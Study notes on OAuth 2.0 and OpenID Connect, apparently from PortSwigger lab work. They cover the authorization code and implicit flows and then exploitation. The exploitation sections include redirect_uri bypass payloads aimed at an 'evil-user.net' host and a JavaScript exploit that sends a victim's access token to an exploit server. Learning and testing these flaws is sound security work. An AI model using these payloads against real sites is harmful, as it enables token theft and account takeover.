# What is OAuth? 
OAuth is an authorization framework that requests limited access to a user's account on another application. OAuth doesn't expose login credentials to the requesting app. It is commonly used when an app requires access to certain (but not all) data on a user's account.

# How does OAuth 2.0 work? 
OAuth works via interactions between three parties. 
- Client application - The website that wants to access some data.
- Resource owner - The user whose data the client app wants to access.
- OAuth service provider - The website that controls the user's data and access to it, provides an API for interacting with an authorization server and resource server. 

There are different OAuth "flows" or "grant types". The "authorization code" and "implicit" grant types are most common. Both follow the steps: 
1. The client app requests access to a subset of data, specifying which grant type and what kind of access they want.
2. The user is prompted to log in to OAuth and explicitly give consent
3. The client app receives a unique access token that proves they have permission from the user to access the data (how this happen may vary depending on grant type)
4. The client app uses the access token to make API calls fetching the data from the resource server.

# OAuth grant types
## OAuth scopes
The `scope` parameter specifies what data the client app wants to access. This is usually unique to each OAuth service. 

Some examples are: 
```
scope=contacts
scope=contacts.read
scope=contact-list-r
scope=https://oauth-authorization-server.com/auth/scopes/user/contacts.readonly 
```

When OAuth is used for authentication, the standardized OpenID Connect scopes are often used instead.

Some examples: 
```
scope=openid profile
scope=openid email
```

## Authorization code grant type
![17f64cb3838eeaca80eee49f1c608b4b.png](../../_resources/17f64cb3838eeaca80eee49f1c608b4b-1.png)

### 1. Authorization request
```
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com 
```

- `client_id`
Mandatory parameter containing the unique identifier of the client application. This value is generated when the client application registers with the OAuth service.
- `redirect_uri`
The URI to which the user's browser should be redirected when sending the authorization code to the client application. This is also known as the "callback URI" or "callback endpoint". Many OAuth attacks are based on exploiting flaws in the validation of this parameter.
- `response_type`
Determines which kind of response the client application is expecting and, therefore, which flow it wants to initiate. For the authorization code grant type, the value should be `code`.
- `scope`
Used to specify which subset of the user's data the client application wants to access. Note that these may be custom scopes set by the OAuth provider or standardized scopes defined by the OpenID Connect specification.
- `state`
Stores a unique, unguessable value that is tied to the current session on the client application. The OAuth service should return this exact value in the response, along with the authorization code. This parameter serves as a form of CSRF token for the client application by making sure that the request to its /callback endpoint is from the same person who initiated the OAuth flow.

### 2. User login and consent
The user will be redirected to a login page and prompted to log in.

### 3. Authorization code grant
If the user consents, they will be redirected to the callback endpoint specified in the `redirect_uri` of the authorization request. It may also send the same `state` parameter.
```
GET /callback?code=a1b2c3d4e5f6g7h8&state=ae13d489bd00e3c24 HTTP/1.1
Host: client-app.com 
```

### 4. Access token request
Once the client app receives the authorization code, it exchanges it for an access token. **IMPORTANT: All communication after this is on a secure back-end channel.**
```
POST /token HTTP/1.1
Host: oauth-authorization-server.com
…
client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8 
```

- `client_secret`
The client application must authenticate itself by including the secret key that it was assigned when registering with the OAuth service. 
- `grant_type`
Used to make sure the new endpoint knows which grant type the client application wants to use. In this case, this should be set to `authorization_code`. 

### 5. Access token grant
The OAuth service grants the client app an access token.
```
{
  "access_token": "z0y9x8w7v6u5",
  "token_type": "Bearer",
  "expires_in": 3600,
  "scope": "openid profile",
  …
} 
```

### 6. API call
Now the client app can fetch the user's data. The token is submitted in the `Authorization: Bearer` header to prove that the client app has permission.
```
GET /userinfo HTTP/1.1
Host: oauth-resource-server.com
Authorization: Bearer z0y9x8w7v6u5 
```

### 7. Resource grant
The resource is granted.
```
{
  "username":"carlos",
  "email":"carlos@carlos-montoya.net",
  …
} 
```

## Implicit grant type
Though much simpler, the implicit grant type is far less secure. All communication happens via browser redirects--there is no secure back-channel. The client application receives the access token immediately after the user gives consent.

![6707756a4d07530f5799e425f382ec7d.png](../../_resources/6707756a4d07530f5799e425f382ec7d-1.png)

###  1. Authorization request
Pretty much like authorization code flow, except with `response_type` set to `token`.
```
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com 
```

### 2. User login and consent
The user logs in and consents.

### 3. Access token grant
The OAuth service will redirect the browser to `redirect_uri` specified in the authorization request, but it will send the access token as a URL fragment.
```
GET /callback#access_token=z0y9x8w7v6u5&token_type=Bearer&expires_in=5000&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: client-app.com 
```

### 4. API call
Unlike in the authorization code flow, the API calls are made via the browser!!
```
GET /userinfo HTTP/1.1
Host: oauth-resource-server.com
Authorization: Bearer z0y9x8w7v6u5 
```

### 5. Resource grant
The resource is granted.
```
{
  "username":"carlos",
  "email":"carlos@carlos-montoya.net"
} 
```

# OAuth authentication
Some websites allow you to log in using existing accounts instead of registering a new one. If so, OAuth 2.0 is probably used. 

OAuth authentication generally looks like: 
1. The user chooses to log in with social media. The client app uses the social media's OAuth service to request access.
2. After receiving the access token, the client app requests identification data from the resource server.
3. Once it has received the data, the client app uses the info (like username/email) and the access token it received from the authorization server instead of a traditional password to login.

## Identifying OAuth authentication
OAuth is pretty easy to get wrong as there is a lot to take in and implement securely. If you see an option to log in to your account from a different website, OAuth is probably being used. Keep an eye out for requests that look like: 
```
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com
```

## Recon
If an external OAuth service is used, you should be able to identify the specific provider from the hostname to which the authorization request is sent. There may be documentation telling you the exact names of the endpoints and configuration options.

Once you know the hostname of the authorization server, try sending a `GET` request to the following standard endpoints: 
```
/.well-known/oauth-authorization-server
/.well-known/openid-configuration
```

# Exploiting OAuth authentication vulns
## Improper implementation of implicit grant type
Sometimes, a certain request is used to assign the user a session cookie. If, say, this `POST` request is exposed via the browser, attackers can change the parameters to impersonate users.

## Flawed CSRF protection
The `state` parameter acts as a sort of CSRF for the OAuth flow, and should be unguessable, like the hash of something tied to the user's session. If the `state` parameter is not used, an attacker can initiate an OAuth flow themselves then trick a user's browser into completing it, like a CSRF attack. 

Example solution: 
First, attach your own social media profile to your account to examine the flow. Notice that there is no `state` parameter, indicating a vulnerability to CSRF. Now, start the process of linking a social media account again, intercepting all requests. Forward the requests until you get to the part where it links the social media using OAuth and a code (`oauth-linking?code=[...]`). This next part of the flow needs to be completed by the admin user, so create a CSRF PoC using this and store it on the exploit server. Drop the original request so that the code remains valid. Once the exploit is sent, your social media account is linked to the admin account, so just login normally using social media and become admin. 

## Leaking authorization codes and access tokens
If attackers can steal auth codes or access tokens, an attacker can access a victim's data, leading to probable compromise. Usually a code or token is sent via the victim's browser to the `/callback` endpoint specified in the `redirect_uri` parameter. If the URI is not validated, a CSRF-like attack can send the code or token to an attacker-controlled `redirect_uri`. An attacker can steal the victim's code then send the code to the legitimate `/callback` (the original `redirect_uri`) to gain access.

Example solution: 
First, induce the victim to begin an `/auth` OAuth flow with a CSRF PoC that points the `redirect_uri` to your exploit server. When the victim executes the exploit, the OAuth callback will navigate to the exploit server and leak the authorization code/access token. This token can be submitted by the attacker as follows to hijack the admin account: `https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE`

## Flawed redirect_uri validation
It is best practice for client applications to provide a genuine whitelist of callback URIs when registering with the OAuth service. This way the OAuth service can validate the `redirect_uri` parameter.

Always experiment with the `redirect_uri` to understand how it is validated.
- Maybe validation is only for a part of the URL. Exploit this.
- Try modifying with arbitrary paths, subdomains, parameters, URL fragments and see what you can change without triggering an error
- If you can append extra values, you can try payloads like `https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/`
- Try submitting duplicate `redirect_uri` parameters for possible parameter pollution. `https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net`
- Special treatment to URLs starting/containing `localhost`? Try registering `localhost.evil-user.net`

## Stealing codes and access tokens via proxy page
Sometimes you can't submit an external domain as the `redirect_uri`. But don't give up yet. Try to find ways to access subdomains or paths. 

You may be able to use directory traversal to supply arbitrary paths: 
`https://client-app.com/oauth/callback/../../example/path` could be interpreted as `https://client-app.com/example/path`

Once you find what pages you are able to set as the redirect URI, you should audit them to see if there is a way to leak the code/token. For the authorization code flow, find a vuln that gives you access to the query parameters. For the implicit grant type, exfiltrate the URL fragment. 

One of the most useful vulnerabilities for this purpose is an open redirect. You can use this as a proxy to forward victims, along with their code or token, to an attacker-controlled domain where you can host any malicious script you like. 

Example solution exploit (open redirect vuln): 
The following script is a two-stage exploit designed to exfiltrate the authorization token of a victim user. This authorization code can then be used to exfiltrate sensitive data and/or hijack sessions. 
```js
<script>
const urlSearchParams = new URLSearchParams(window.location.hash.substr(1));
const token = urlSearchParams.get('access_token');
if(token) {
window.location.href = 'https://exploit-ac7f1f781e6e65aac17f69960111000d.web-security-academy.net/log?' + token;
} else { 
window.location.href = 'https://oauth-accc1f331ed265c4c121699002c1006b.web-security-academy.net/auth?client_id=a93nsr6i06obvp7bm2ldn&redirect_uri=https://acbf1f4f1e1465d9c11a69e3009e0045.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-ac7f1f781e6e65aac17f69960111000d.web-security-academy.net/exploit&response_type=token&nonce=2115065112&scope=openid%20profile%20email';
}
</script>
```

# OpenID Connect (and Vulnerabilities)
OAuth was not designed with authentication in mind initially, just for authorizations of specific resources between applications. However, it soon became obvious that authentication through OAuth could be useful. To standardize this, OpenID Connect was created, extending OAuth functionalities. 

The OAuth flows stay the same. The key difference is that there is an additional, standardized set of scopes and an extra response type called `id_token`.

## OpenID Connect roles
The roles for OpenID Connect are basically the same as OAuth. However, it uses different terminology.
- Relying party - The app requesting authentication of a user (OAuth client application)
- End user - The user who is authenticated (OAuth resource owner)
- OpenID provider - An OAuth service that is configured to support OpenID Connect

## OpenID Connect claims and scopes
"Claims" refers to the key/value pairs that represent information about the user, like `family_name:Doe`
Client applications must specify the scope `openid`, along with one or more standard scopes: 
- `profile`
- `email`
- `address`
- `phone`

## ID token response type
The `id_token` response type returns a JWT (JSON web token) payload that contains a list of claims based on the scope initially requested. It also contains info on how/when the user was last authenticated by the OAuth service. The client app can use this to decide whether the user has been sufficiently authenticated. 

Note that multiple response types are supported by OAuth, so the following `response_type` values are possible (both will be sent to the client app):
```
response_type=id_token token
response_type=id_token code 
```

## Identifying OpenID Connect
If there is an `openid` scope used, OpenID is probably being used. You can also try adding the `openid` scope or change the response type to `id_token` to see if it results in an error or not. You may be able to access the config file from the standard endpoint `/.well-known/openid-configuration`

# Exploiting OpenID Connect vulnerabilities
Because OpenID sits on top of OAuth, some OAuth-based attacks may also work. However, there are a few additional vulnerabilities that are OpenID specific. 

## Unprotected dynamic client registration
OpenID has a standardized way of allowing client applications to register with the provider. Dynamic client registration allows the client application to register itself via a POST request to some `/registration` endpoint. The information submitted is in JSON format and often includes whitelisted redirect URIs and additional information.

Example:
```
POST /openid/register HTTP/1.1
Content-Type: application/json
Accept: application/json
Host: oauth-authorization-server.com
Authorization: Bearer ab12cd34ef56gh89

{
  "application_type": "web",
  "redirect_uris": [
    "https://client-app.com/callback",
    "https://client-app.com/callback2"
    ],
  "client_name": "My Application",
  "logo_uri": "https://client-app.com/logo.png",
  "token_endpoint_auth_method": "client_secret_basic",
  "jwks_uri": "https://client-app.com/my_public_keys.jwks",
  "userinfo_encrypted_response_alg": "RSA1_5",
  "userinfo_encrypted_response_enc": "A128CBC-HS256",
  …
} 
```

If no authentication is required (in the above, the `Authorization` header is included), attackers can register their own malicious applications. Additionally, since some properties are URIs, second-order SSRF can occur if the OpenID provider accesses them. 

